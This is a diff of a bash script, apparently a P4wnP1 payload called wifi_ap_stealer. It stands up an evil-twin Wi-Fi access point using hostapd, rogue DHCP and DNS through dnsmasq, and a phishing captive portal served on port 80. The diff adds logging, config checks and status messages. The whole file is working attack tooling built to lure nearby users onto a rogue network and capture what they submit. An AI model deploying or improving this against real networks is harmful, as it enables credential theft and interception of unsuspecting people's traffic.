@@ -1,42 +1,46 @@
 #!/bin/bash
-# payloads/network/wifi_ap_stealer.sh
+# /opt/p4wnp1/payloads/network/wifi_ap_stealer.sh
+# Description: Evil twin AP with rogue DNS, DHCP, and HTTP phishing server
 
-### Description: Evil AP with captive portal for phishing
-### Requirements: hostapd, dnsmasq, lighttpd or Python HTTP server
+set -euo pipefail
 
+# === Config ===
 PAYLOAD_NAME="wifi_ap_stealer"
 HOSTAPD_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_hostapd.conf"
 DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"
 WEB_ROOT="/opt/p4wnp1/www"
 LOG_DIR="/opt/p4wnp1/logs"
+LOG="$LOG_DIR/${PAYLOAD_NAME}.log"
+WEB_LOG="$LOG_DIR/${PAYLOAD_NAME}_web.log"
+DNS_LOG="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log"
 
-mkdir -p "$LOG_DIR"
-mkdir -p "$WEB_ROOT"
+mkdir -p "$LOG_DIR" "$WEB_ROOT"
+exec > >(tee -a "$LOG") 2>&1
 
-pkill hostapd || true
-pkill dnsmasq || true
-pkill python3 || true
+echo "[*] Starting Evil AP (wifi_ap_stealer) at $(date)"
 
-if [ ! -f "$HOSTAPD_CONF" ]; then
-  echo "[!] Missing hostapd config: $HOSTAPD_CONF"
-  exit 1
-fi
+# === Validate configs ===
+[[ -f "$HOSTAPD_CONF" ]] || { echo "[!] Missing hostapd config: $HOSTAPD_CONF"; exit 1; }
+[[ -f "$DNSMASQ_CONF" ]] || { echo "[!] Missing dnsmasq config: $DNSMASQ_CONF"; exit 1; }
 
-if [ ! -f "$DNSMASQ_CONF" ]; then
-  echo "[!] Missing dnsmasq config: $DNSMASQ_CONF"
-  exit 1
-fi
+# === Kill previous rogue services ===
+pkill -f hostapd || true
+pkill -f dnsmasq || true
+pkill -f "python3 -m http.server" || true
+sleep 1
 
-# Start fake AP
+# === Launch rogue AP ===
+echo "[+] Launching hostapd..."
 hostapd "$HOSTAPD_CONF" &
 
-# Start rogue DHCP/DNS
 sleep 2
-dnsmasq --conf-file="$DNSMASQ_CONF" --log-facility="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log" &
 
-# Start fake captive portal
+echo "[+] Launching dnsmasq..."
+dnsmasq --conf-file="$DNSMASQ_CONF" --log-facility="$DNS_LOG" &
+
+# === Launch fake captive portal ===
+echo "[+] Launching phishing web server from $WEB_ROOT"
 cd "$WEB_ROOT"
-python3 -m http.server 80 > "$LOG_DIR/${PAYLOAD_NAME}_web.log" 2>&1 &
+python3 -m http.server 80 > "$WEB_LOG" 2>&1 &
 
-echo "[+] Evil AP running. Logs in $LOG_DIR"
-exit 0
+echo "[✓] Evil AP + phishing portal is now active."
